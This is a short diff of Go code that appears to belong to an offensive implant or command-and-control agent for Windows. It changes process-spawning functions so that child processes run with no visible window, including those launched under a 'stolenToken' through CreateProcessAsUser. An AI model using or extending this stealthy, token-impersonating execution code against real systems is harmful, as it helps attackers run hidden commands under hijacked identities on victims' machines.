@@ -119,7 +119,7 @@ func runNative(path string, args string) ([]byte, error) {
 	} else {
 		return nil, errors.New("path is not null or %COMSPEC%")
 	}
-	err = createProcessNative(pathPtr, windows.StringToUTF16Ptr(args), nil, nil, true, 0, nil, nil, &sI, &pI, false)
+	err = createProcessNative(pathPtr, windows.StringToUTF16Ptr(args), nil, nil, true, windows.CREATE_NO_WINDOW, nil, nil, &sI, &pI, false)
 
 	if err != nil {
 		return nil, err
@@ -148,7 +148,7 @@ func execNative(b []byte) error {
 	// when appName set to null, will use the first part of commandLine as the app, and rest as args
 	defer windows.CloseHandle(pI.Process)
 	defer windows.CloseHandle(pI.Thread)
-	return createProcessNative(nil, program, nil, nil, true, 0, nil, nil, &sI, &pI, false)
+	return createProcessNative(nil, program, nil, nil, true, windows.CREATE_NO_WINDOW, nil, nil, &sI, &pI, false)
 }
 
 // if there is a token, use it to create new process
@@ -159,7 +159,7 @@ func createProcessNative(appName *uint16, commandLine *uint16, procSecurity *win
 			if err != windows.ERROR_PRIVILEGE_NOT_HELD {
 				return errors.New(fmt.Sprintf("CreateProcessWithTokenW error: %s", err))
 			}
-			err = windows.CreateProcessAsUser(stolenToken, appName, commandLine, nil, nil, false, 0, nil, nil, startupInfo, outProcInfo)
+			err = windows.CreateProcessAsUser(stolenToken, appName, commandLine, procSecurity, threadSecurity, inheritHandles, creationFlags, env, currentDir, startupInfo, outProcInfo)
 			if err != nil {
 				return err
 			}
